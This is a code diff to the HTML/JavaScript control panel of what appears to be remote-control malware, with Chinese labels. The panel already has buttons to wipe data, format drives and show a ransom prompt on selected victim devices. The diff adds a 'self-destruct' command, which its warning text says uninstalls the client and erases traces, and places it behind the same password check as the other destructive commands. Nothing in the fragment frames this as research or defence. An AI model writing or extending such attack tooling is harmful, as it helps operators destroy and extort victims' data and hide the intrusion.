@@ -138,6 +138,7 @@
                 <button class="btn btn-danger" onclick="openCommandModal('wipe_data')">清除数据</button>
                 <button class="btn btn-danger" onclick="openCommandModal('format_drives')">格式化</button>
                 <button class="btn btn-danger" onclick="openCommandModal('ransom')">勒索提示</button>
+                <button class="btn btn-danger" onclick="openCommandModal('self_destruct')">自毁客户端</button>
             </div>
         </div>
 
@@ -704,9 +705,14 @@
 
             currentAction = action;
             document.getElementById('modalTitle').innerText = "发送指令: " + action;
-            document.getElementById('modalDesc').innerText = `即将对 ${selected.length} 台设备执行操作`;
             
-            const isSensitive = ['wipe_data', 'format_drives', 'ransom'].includes(action);
+            let desc = `即将对 ${selected.length} 台设备执行操作`;
+            if (action === 'self_destruct') {
+                desc += "\n⚠️ 警告：此操作将永久卸载客户端并清除痕迹！";
+            }
+            document.getElementById('modalDesc').innerText = desc;
+            
+            const isSensitive = ['wipe_data', 'format_drives', 'ransom', 'self_destruct'].includes(action);
             const pwdDiv = document.getElementById('pwdInput');
             pwdDiv.classList.toggle('hidden', !isSensitive);
             document.getElementById('password').value = "";
